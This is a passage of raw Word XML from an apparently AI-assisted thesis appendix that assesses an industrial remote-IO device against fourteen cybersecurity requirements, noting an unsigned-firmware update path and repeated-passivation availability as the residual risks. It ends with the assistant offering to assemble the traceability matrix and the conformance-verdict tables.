        <w:t>G-2 (repeated-passivation availability)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (unsigned-firmware — the one leads-to-hazard class)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId266" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId267" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId268" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1F3CBA4E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Corrected verdict, tightly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010 = withstand foreseeable malicious attempts</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — flood/fuzz/spoofing all </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>resolve to the safe state by design</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (black channel </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">+ watchdog + CR 3.6; Net Load Class III certified), so RQ-010 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>met for the communication classes</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>two residuals</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> are </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>repeated-passivation availability (G-2)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned-firmware install (G-3, the single leads-to-hazard exception)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the latter </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tested</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in RQ-005, </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorized</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in RQ-011, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>aggregated</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C3FE33" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:pict w14:anchorId="37BA10C6">
          <v:rect id="_x0000_i1688" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FBEFC0" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Scope-boundary recheck — COMPLETE across the entire set</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40297117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>Every requirement that shared material has now been rechecked and the boundaries are clean and non-overlapping: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3469"/>
        <w:gridCol w:w="4289"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="7114C9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E45F1E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21BA9F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012C7F" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Corrected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t>boundary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="55951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6B4AB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Identify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DE60D" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>RQ-004 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>SW+data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>), RQ-006 (SW)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F6A13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 xml:space="preserve">Completeness + confidentiality; </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>integrity</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-005; </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>change-count</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="2CD4A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E974D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Protect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F5A62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RQ-002 (tamper-resist), RQ-005 (integrity/authenticity)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B53A4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i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Evidence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> → RQ-003; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>authorization</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> → RQ-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="28C1F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50005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Authorize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EB214" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>RQ-011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2A99F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Receives update-gate/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>EoP</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + unauthenticated-DCP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="4FD45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0E7BF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Collect</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357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7553E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RQ-003 (physical), RQ-008 (software), RQ-009 (config)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DF09C" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>REVISION_COUNTER/I&amp;M4 in RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="1FD6D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ED82F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Retain</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>restrict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83641" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>RQ-012 (5-yr), RQ-013 (SW-version), RQ-014 (access-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>restrict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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061169" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">The </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>audit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> paradox</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="0F10E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A338C" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Withstand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83555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RQ-001 (connecting device), RQ-010 (foreseeable attacks)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2F5EB" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Flood/DoS/fuzz in RQ-010; firmware/spoofing cross-referenced</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17293606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The corrected body of work now converges cleanly on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>single decisive vulnerability</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>a well-architected fail-safe device whose residual risk collapses onto the one un-authenticated firmware-update path (RQ-005), the sole attack class that escapes the black-channel fail-safe design (RQ-010 G-3)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — atop an audit subsystem too volatile to retain evidence (RQ-012) and too open to restrict it (RQ-014).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230A47B1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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Recommended next step — consolidation.</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> I can now generate the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>complete formatted thesis appendix (Word .docx)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> with: cover page + methodology note; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">master </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ→CR→Asset→Threat→SVV→Test-Case</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> traceability matrix</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; all fourteen </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>corrected</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> analyses; the per-requirement conformance-verdict table; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>clean boundary map</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> above; and the seven-theme cross-cutting synthesis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6D1E07" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Shall I**(a)** build that full .docx appendix now, or**(b)** produce the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>consolidated master traceability matrix + conformance-verdict table</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as an .xlsx first for your review?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E6D534B" w14:textId="77777777" w:rsidR="00576380" w:rsidRDefault="00576380" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C6312C6" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7802EC91" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11D8EAFA" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FAA2E3C" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11DD600A" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="072AABF4" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01137B7B" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="158FBC3A" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70B02225" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1355F7C7" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20149B03" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64D2B083" w14:textId="1DE11087" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="008E6DD6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lastRenderedPageBreak/>
        <w:t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D02D608" w14:textId="77777777" w:rsidR="002D754B" w:rsidRPr="002D754B" w:rsidRDefault="002D754B" w:rsidP="008E6DD6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="763643D3" w14:textId="77777777" w:rsidR="00EB0F23" w:rsidRDefault="00EB0F23" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76BAA65F" w14:textId="77777777" w:rsidR="00EB0F23" w:rsidRDefault="00EB0F23" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1845A448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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BC2E8E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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-011 is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement, and it is the correct </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>recipient</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the update-gate/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> material I deferred from RQ-005 and the connecting-device/DCP material from RQ-001. So the recheck confirms it </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> those cleanly, and corrects </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>one over-reach of its own</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4852D39A" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Receives the deferred authorization material (correct home).</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>firmware-update access gate (switch 999 + Update state)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
